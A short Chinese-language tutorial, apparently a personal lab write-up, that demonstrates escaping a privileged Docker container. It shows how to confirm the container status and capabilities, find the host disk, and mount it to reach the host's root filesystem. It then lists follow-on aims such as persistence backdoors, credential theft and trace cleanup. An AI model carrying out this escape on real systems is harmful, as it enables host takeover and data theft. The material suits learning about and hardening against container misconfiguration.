首先以特权模式运行一个容器
```
docker run --rm --privileged=true -it alpine
```


假设作为一名攻击者，此时打入并控制了这个容器，需要进行容器逃逸，突破容器隔离边界，从受限制的容器环境获得宿主机权限，进而扩大控制范围

再往后，甚至可以横向攻击其他容器、窃取云环境凭证、攻击k8s集群、在宿主机建立持久化后门



使用ls命令查看，出现图中的`.dockerenv`文件说明在容器里面
![](/assets/img/Pasted image 20260722214245.png)


已经发现处在容器里，看是不是特权模式运行
```
cat /proc/self/status | grep CapEff
```


输出一串F说明该容器以特权模式运行，具备较高权限
![](/assets/img/Pasted image 20260722215244.png)


在容器内执行fdisk-l、blkid、lsblk -f 等命令，寻找宿主机磁盘
![](/assets/img/Pasted image 20260722215656.png)

/dev/dm-0为宿主机磁盘


在容器内创建一个目录，将宿主机磁盘挂载到这个新建的目录
```
mkdir /tmp/test && mount /dev/dm-0 /tmp/test
```


容器内执行
```
ls /tmp/test
```


如图，已经成功进入宿主机的根目录
![](/assets/img/Pasted image 20260722220116.png)


到这一步就可以进行信息收集、建立持久化后门、寻找敏感数据（比如配置文件）以及痕迹清理
